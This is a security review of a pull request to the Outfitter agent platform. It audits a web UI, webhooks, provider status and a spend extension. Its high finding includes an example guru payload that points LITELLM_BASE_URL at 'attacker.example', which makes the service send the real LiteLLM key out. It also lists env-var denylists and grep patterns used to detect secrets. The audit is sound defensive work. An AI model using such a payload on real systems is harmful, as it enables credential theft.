# Security Review — PR #15 (`outfitter/round-four`, worktree `pi-agent-teleport-84d05f`)

**Scope:** `git diff origin/main...HEAD` — web UI package (`outfitter/packages/web`), SPA static
route (`outfitter/packages/api/src/routes/static.ts`), provider status service
(`outfitter/packages/api/src/providers-status.ts`, `routes/providers.ts`), the ngrok webhook
(`routes/hooks.ts`), the spend extension (`outfitter/packages/agentd/pi-extension/outfitter-spend.ts`),
the mgm teleport `OutfitterStore` (`mgm/.pi/extensions/teleport/outfitter-store.ts`), and the new
`runState` field on `GET /api/sessions/:id` / `countRunningExecutions`.

**Risk Level:** HIGH (one credential-exfiltration/SSRF path; everything else sound or pre-existing/low)

## Summary
- Critical Issues: 0
- High Issues: 1
- Medium Issues: 2
- Low Issues: 2

---

## High Issues

### 1. `outfitter-spend.ts` sends the real per-run LiteLLM key to a guru-controlled `LITELLM_BASE_URL` (SSRF + credential exfiltration)
**Severity:** HIGH
**Category:** A10 (SSRF) / A02 (Cryptographic/secrets failure) / A05 (Security misconfiguration — incomplete env allowlist)
**Location:**
- `outfitter/packages/agentd/pi-extension/outfitter-spend.ts:216-222` (`litellmRootUrl()` / `litellmKey()` read `process.env.LITELLM_BASE_URL`, `LITELLM_AGENT_KEY`, `LITELLM_API_KEY` with no validation)
- `outfitter/packages/agentd/pi-extension/outfitter-spend.ts:234-251` (`litellmGet` sends `Authorization: Bearer <key>` to that URL)
- `outfitter/packages/agentd/src/run.ts:378-403` (`rendered.env` — i.e. `guru.env` — is spread into the spawned `pi` process's env; `secretEnv.LITELLM_AGENT_KEY` is spread *after* it and wins, but `LITELLM_BASE_URL` is never set by `secretEnv`, so a guru-supplied value survives)
- `outfitter/packages/agentd/src/guru.ts:33-42` (`DENYLISTED_GURU_ENV_KEYS = {NODE_OPTIONS, LD_PRELOAD, LD_LIBRARY_PATH, PATH, HOME}` plus `GIT_*` — does **not** include `LITELLM_BASE_URL`, `LITELLM_API_KEY`, or `LITELLM_AGENT_KEY`)
- `outfitter/packages/api/src/routes/gurus.ts:8-20` (same denylist, enforced at guru create/update time; comment explicitly states "**Any domain user can create/edit a guru**")

**Exploitability:** Remote, authenticated as any IAP-authenticated domain user (no special role/admin check on `POST/PUT /api/gurus` — see `gurus.ts:22-48`, which has no ownership or role check at all).

**Blast Radius:** Exfiltration of the organization's live LiteLLM API key (the `spec.secrets.litellmKey` provisioned per-session by `SecretsBroker`, normally never sent outside the LiteLLM proxy/agentd/api trust boundary — see `secrets.ts`'s "no shared secrets between our components" decision). Whoever receives it can spend against the org's LiteLLM budget, read `/key/info` (budget, spend history) and call any model the key is scoped to — i.e. a live credential leak, not just a metadata leak.

**Issue:** Any authenticated Outfitter user can create a Guru with:
```json
{ "name": "x", "model": "litellm/claude-auto-llm", "env": { "LITELLM_BASE_URL": "https://attacker.example" } }
```
`POST/PUT /api/gurus` only rejects `NODE_OPTIONS/LD_PRELOAD/LD_LIBRARY_PATH/PATH/HOME/GIT_*` (`gurus.ts:15`); `LITELLM_BASE_URL` passes straight through into `Guru.env`. When a session runs with this guru, `agentlink.ts` sends `guru.env` in `run.spec`, `run.ts`'s `begin()` calls `renderGuru(spec.guru, …)`, whose `env` (`guru.ts:71-79`) includes the attacker's `LITELLM_BASE_URL` unfiltered, and `run.ts:403` spawns `pi` with `env: { ...rendered.env, ...secretEnv, ...userEnv }`. `secretEnv` only overrides `LITELLM_AGENT_KEY` (`run.ts:385`), not `LITELLM_BASE_URL`.

Inside the sandbox, `outfitter-spend.ts`'s `session_start` handler calls `fetchModelPrices()` and `fetchKeySpend()`, both going through `litellmGet()`, which does:
```ts
fetch(`${litellmRootUrl()}${path}`, { headers: { authorization: `Bearer ${key}` }, signal })
```
`litellmRootUrl()` resolves from the attacker-controlled `LITELLM_BASE_URL`, and `key` is `litellmKey()` → `process.env.LITELLM_AGENT_KEY` — the **real** session key (not attacker-controlled, since `secretEnv` wins for that one var). So on every session run with this guru, the real LiteLLM key is sent as a Bearer token, plus a `GET /model/info` and `GET /key/info` request, to the attacker's server. This is also a generic SSRF primitive (agentd can be made to issue outbound HTTP requests to an arbitrary attacker-chosen host from inside the sandbox network).

Note: this is a new, concretely exploitable path introduced by this PR — before it, nothing inside the sandboxed `pi` process made an outbound request keyed off `LITELLM_BASE_URL`/`LITELLM_AGENT_KEY` using the real per-run secret (the pre-existing denylist gap on `LITELLM_BASE_URL` existed, but had no matching code path to exploit through). `outfitter-spend.ts` is what turns the gap into an exploitable leak.

**Remediation:** Add `LITELLM_BASE_URL`, `LITELLM_API_KEY`, and `LITELLM_AGENT_KEY` to both denylists (defense in depth, matching the existing "belt and suspenders" pattern already used for `GIT_*`/`NODE_OPTIONS`/etc.), and/or have `outfitter-spend.ts` read the LiteLLM base URL from a value agentd controls directly (e.g. passed via `secretEnv`/a dedicated non-guru-overridable env var) rather than trusting `process.env.LITELLM_BASE_URL` verbatim:

```ts
// outfitter/packages/api/src/routes/gurus.ts
const DENYLISTED_GURU_ENV_KEYS = new Set([
  "NODE_OPTIONS", "LD_PRELOAD", "LD_LIBRARY_PATH", "PATH", "HOME",
  "LITELLM_BASE_URL", "LITELLM_API_KEY", "LITELLM_AGENT_KEY",
]);
```
```ts
// outfitter/packages/agentd/src/guru.ts — same set, mirrored as agentd's own last line of defense
const DENYLISTED_GURU_ENV_KEYS = new Set([
  "NODE_OPTIONS", "LD_PRELOAD", "LD_LIBRARY_PATH", "PATH", "HOME",
  "LITELLM_BASE_URL", "LITELLM_API_KEY", "LITELLM_AGENT_KEY",
]);
```
Belt-and-suspenders: also have `run.ts`'s `secretEnv` set `LITELLM_BASE_URL` itself from `config`/`spec` (server-controlled), spread *after* `rendered.env`, the same way it already pins `LITELLM_AGENT_KEY` — so even a future new denylist gap can't redirect the outbound call.

---

## Medium Issues

### 2. `POST /api/hooks/ngrok` has no replay protection
**Severity:** MEDIUM
**Category:** A07 (broken auth — for a machine-to-machine webhook) / A04 (insecure design)
**Location:** `outfitter/packages/api/src/routes/hooks.ts:29-36` (`verifyNgrokSignature`), `:54-78` (route handler)

**Exploitability:** Remote, unauthenticated network position (the route is intentionally reachable with no IAP — `server.ts:82-94` carves `/api/hooks/*` out of the IAP preHandler because it's the `link` role's public, `--allow-unauthenticated` Cloud Run service). Requires having observed one valid `(body, ngrok-signature)` pair once (e.g. via a logging proxy, a compromised ngrok event-destination relay, or packet capture on a misconfigured relay leg), since the scheme is a bare HMAC over the body with no timestamp or nonce.

**Blast Radius:** Repeated/indefinite replay lets an attacker toggle `laptopOnline` state (`ctx.laptopProbe.setOnline` / `ProviderStatusService.noteLaptopTransition`) at will — forcing the E2.8 laptop preflight and the E3.6 dashboard to believe the laptop is up when it's down (or vice versa) long after the real transition, e.g. masking a real outage or causing a run to be routed to a model that isn't actually reachable. Not attacker-code-execution or data-exfiltration; blast radius is limited to this one boolean status signal.

**Issue:** `verifyNgrokSignature` (hooks.ts:29-36) is a correct constant-time HMAC-SHA256 check, but validates only that the body+signature pair was produced with the shared secret at some point — not that this specific delivery is fresh. A captured valid request can be POSTed again unlimited times, indefinitely, with no server-side state to reject it.

**Remediation:** If the eventual delivery path proves out a timestamp header from ngrok's real event-destination envelope (the module comment notes the exact envelope is still unconfirmed), verify it's within a small window (e.g. ±5 minutes) as part of the signature check, and track recently-seen signatures/event ids in a short-TTL cache to reject exact duplicates:
```ts
export function verifyNgrokSignature(rawBody: string, headerValue: string | undefined, secret: string, timestamp?: string): boolean {
  if (!headerValue || !secret) return false;
  if (timestamp) {
    const skewMs = Math.abs(Date.now() - Date.parse(timestamp));
    if (!Number.isFinite(skewMs) || skewMs > 5 * 60_000) return false;
  }
  // ... existing HMAC compare ...
}
```
Given the low blast radius (a status flag, not a privileged action), this can reasonably be deferred until the real delivery envelope (with a timestamp/nonce field) is confirmed — flag it in `docs/reports/api.md`'s "deviations" section so it isn't forgotten.

### 3. `POST /api/providers/refresh` has no rate limit and triggers 4 outbound probes per call
**Severity:** MEDIUM (defense-in-depth; not independently exploitable given IAP)
**Category:** A04 (insecure design) / A05 (security misconfiguration)
**Location:** `outfitter/packages/api/src/routes/providers.ts:20-22`, `outfitter/packages/api/src/providers-status.ts:369-379` (`pollOnce`)

**Exploitability:** Remote, but requires a valid IAP session (any authenticated domain user — same population as Finding #1). Not exploitable by an outside attacker.

**Blast Radius:** A malicious or compromised domain account can hammer `/api/providers/refresh` to (a) generate repeated outbound calls to `api.ngrok.com`, the laptop's ngrok tunnel, and LiteLLM's management endpoints (each bounded to 3s by `DEFAULT_TIMEOUT_MS`, so this is a mild amplification/DoS-adjacent nuisance against those third parties, not the Outfitter API itself), and (b) call `CloudRunProvider.listExecutions` repeatedly (a Cloud Run Admin API call under the service's own ADC credentials — subject to that API's own quota, so sustained abuse could exhaust the project's Cloud Run Admin API quota and degrade the E2.10 probe / other Cloud Run tooling for the whole org).

**Remediation:** Add a short per-caller or global cooldown (e.g. reject a manual refresh within N seconds of the last `pollOnce`, mirroring `config.providerPollMs`) rather than trusting IAP alone to bound call volume:
```ts
let lastRefreshAt = 0;
app.post("/api/providers/refresh", async (req, reply) => {
  const now = Date.now();
  if (now - lastRefreshAt < 10_000) {
    return reply.code(429).send({ error: "refresh already in progress; try again shortly" });
  }
  lastRefreshAt = now;
  return { providers: await ctx.providerStatus.pollOnce() };
});
```

---

## Low Issues

### 4. Provider `meta` (ngrok public tunnel URLs, LiteLLM model/spend info) is returned to every domain user with no per-row access control
**Severity:** LOW
**Category:** A01 (broken access control) — informational disclosure only
**Location:** `outfitter/packages/api/src/providers-status.ts:99-109` (`ngrokRowFromEndpoint` puts `publicUrl`/`proto`/`region` in `meta`), `:273-283` (`litellm` row's `meta.key` = `{spend, maxBudget}`), `outfitter/packages/api/src/routes/providers.ts:10-12` (`GET /api/providers`, no filtering)

**Exploitability:** Requires a valid IAP session; any authenticated domain user sees every row (there's no per-user or per-team scoping on providers, unlike sessions' `ownerEmail`, itself not yet enforced either — see below).

**Blast Radius:** Low — the ngrok `public_url`/`hostname` values are, by definition, already internet-reachable tunnel endpoints (not secrets), and `meta.key` on the LiteLLM row only ever carries `spend`/`maxBudget` numbers (`parseKeyInfo`, `providers-status.ts:234-239`) — the actual LiteLLM key string is never included. So this is exposure of operational metadata (which tunnels are live, aggregate org spend/budget) to any domain user, not a credential leak.

**Remediation:** No code change required unless the org's threat model treats "any domain user can see the org's aggregate LiteLLM spend/budget and live tunnel hostnames" as sensitive; if so, gate `/api/providers*` behind an admin/operator role rather than "any IAP identity" the same way a future guru-management role check (Finding #1's exploitability note) should be added.

### 5. `LITELLM_ADMIN_KEY`/`SecretsBroker.defaultLitellmKey()` failures are logged as plain strings that could echo transient upstream error bodies
**Severity:** LOW
**Category:** A09 (logging failures) — verified sound, listed for completeness
**Location:** `outfitter/packages/api/src/providers-status.ts:279` (`detail: health.ok ? undefined : \`health check HTTP ${health.status}\``), `:284-286` (catch block uses `errMessage(err)`)

**Exploitability:** N/A — this is an audit note, not a finding requiring a fix.

**Issue checked and found sound:** `errMessage()` (providers-status.ts:31-33) only ever surfaces `err.message`/`String(err)` from a `fetch`/timeout failure, never a response body, and the LiteLLM/ngrok/laptop probes never log or forward the actual bearer token/key value anywhere (headers are only ever sent, never echoed back into a `detail`/log field). `fetchJson` (providers-status.ts:60-80) swallows the response body into `json`, which is used for parsing (`parseModelInfo`/`parseKeyInfo`/`parseLmStudioModels`) but never written to a `detail` string. No remediation needed; noted as checked.

---

## What Was Checked and Found Sound

- **XSS in transcript rendering** (`outfitter/packages/web/src/components/EntryItem.tsx`, `UiRequestPanel.tsx`, `ProvidersPage.tsx`, `Composer.tsx`): every field of untrusted model/tool output (`view.text`, `request.title`, `request.message`, tool-call `input` via `JSON.stringify` inside `<pre>`) is rendered as a React child / text node, never via `dangerouslySetInnerHTML`, `innerHTML`, or string-templated HTML. Grepped the whole diff (`web/src`, `api/src`, `mgm/.pi/extensions/teleport`, `agentd/pi-extension`) for `dangerouslySetInnerHTML|innerHTML|outerHTML|document.write|eval(` — zero matches. XSS via transcript content is not exploitable as written.
- **Dev token in localStorage** (`outfitter/packages/web/src/api/client.ts:104-112`): `authHeaders()` only reads `outfitterDevToken` from `localStorage` and only sends it as an `Authorization: Bearer` header on same-origin fetches; it's never written by any code in this diff (must be set manually via devtools per the module comment), and is scoped to local/dev use (`OUTFITTER_DEV=1` disables the IAP check server-side anyway, so a dev-mode deployment already accepts any/no bearer). Production relies on IAP cookies (`credentials: "same-origin"`), not this token. No XSS sink exists in this diff that could steal it (see above), so the usual "token in localStorage is readable by any injected script" risk has no injection vector to pair with here.
- **SPA fallback path handling** (`outfitter/packages/api/src/routes/static.ts`): uses `@fastify/static` (v10.1.4, current, `npm audit` reports 0 vulnerabilities in the whole `outfitter` lockfile) with `wildcard:false`, which registers concrete file routes at startup rather than doing runtime path resolution — not a hand-rolled path-join vulnerable to `../` traversal. The `setNotFoundHandler` only ever calls `reply.sendFile("index.html")` with a hardcoded filename (never attacker input), and explicitly excludes `/api/*` and `/agent/*` from the SPA fallback so it can never shadow an API route.
- **ngrok webhook HMAC verification correctness** (`hooks.ts:29-36`): equal-length check before `timingSafeEqual` (avoids the length-mismatch throw), secret-empty and header-missing both fail closed, raw body captured via a scoped `addContentTypeParser` before JSON parsing so the signature is verified over the exact bytes. Sound aside from Finding #2 (replay).
- **IAP / agentd identity verification** (`outfitter/packages/api/src/auth.ts`): unchanged by this diff; `identityFromRequest`/`verifyAgentToken` correctly verify signature/issuer/audience/expiry and reject `email_verified: false`. `server.ts`'s new provider routes are registered inside the same `role !== "link"` block and thus inherit the existing IAP `preHandler` — confirmed `/api/providers*` is not in the `/api/hooks/*` IAP carve-out.
- **`LITELLM_AGENT_KEY` secret handling in `run.ts`**: `secretEnv.LITELLM_AGENT_KEY` (the real per-run key) is spread *after* `rendered.env` (`run.ts:403`), so a guru cannot override the key value itself, only (per Finding #1) the base URL it's sent to. `deps.logger?.addSecret(spec.secrets.litellmKey)` (`run.ts:317`) registers the real key for redaction before any logging can occur.
- **`OUTFITTER_SPEND_FILE` line validation** (`outfitter/packages/agentd/src/pi.ts:211-242`, `run.ts:463-490`): correctly treats the file as untrusted (writable by the model's own shell user) and validates shape/ranges (`validateSpendLine`) before trusting any field, with a bounded, truncated log line (`summarizeForLog`, `run.ts:139-149`) on rejection — can't be used to flood logs or inject unbounded/malformed data upstream.
- **`OutfitterStore` (`mgm/.pi/extensions/teleport/outfitter-store.ts`)**: `gcloud auth print-identity-token` is invoked via `execFile` (array argv, no shell interpolation — `iapClientId` can't be used for shell injection even if attacker-influenced), the token is cached only in memory (`cachedIapToken`, cleared on 401) and never written to disk (confirmed no `fs`/`writeFile` calls in the module), and error messages built from server responses (`res.text()`) never include the token itself. `--force` semantics only skip the "wait for the active run to stop" polling loop and print a warning — they do not bypass auth or weaken any server-side check (the server's own `stop`/`export.jsonl` endpoints still enforce whatever auth they already enforce).
- **`GET /api/sessions/:id` `runState` addition** (`routes/sessions.ts:105-109`) and **`countRunningExecutions`** (`providers/cloudrun.ts:160-171`): `runState` only adds a field already computed elsewhere for the list endpoint (`summarize()`) to the single-session response — it does not introduce a new authorization gap; every session route already uses the same `getSessionOr404` with no owner check (the "Recorded but not yet enforced" `ownerEmail` gap at `sessions.ts:73-75` is pre-existing, not introduced by this diff, and already flagged as a known, deliberately-deferred item per its own comment/EPIC.md E2.2 reference — not re-flagged here as a new finding). `countRunningExecutions` is a read-only Cloud Run Admin API call gated by the same IAP-protected `/api/providers*` routes, using the service's own ADC credentials, filtering only on `completionTime` (no injectable input).
- **Dependency audit**: `npm audit --omit=dev` against `outfitter/package-lock.json` (which covers `@fastify/static`, all new `packages/web` frontend deps — React, Vite, etc. — and everything else touched by this PR) reports **0 vulnerabilities**.
- **Secrets scan**: grepped the diff for `api[_-]?key|password|secret|token` hardcoded literals — every match is either a type/field name, an env-var name, or a comment; no hardcoded credential values found in the new/changed files.
- **CORS**: no `Access-Control-*` handling or CORS middleware was added; the API remains same-origin only (browser calls go through the same Cloud Run origin IAP fronts), consistent with `client.ts`'s `credentials: "same-origin"`.

## Security Checklist
- [x] No hardcoded secrets
- [ ] All inputs validated — guru `env` allowlist/denylist has a gap (Finding #1)
- [x] Injection prevention verified (no XSS sink; no shell injection in mgm CLI changes)
- [x] Authentication/authorization verified for IAP/agentd identity paths (unchanged by this diff)
- [ ] Webhook replay protection — gap (Finding #2, low blast radius)
- [x] Dependencies audited (`npm audit`: 0 vulnerabilities)
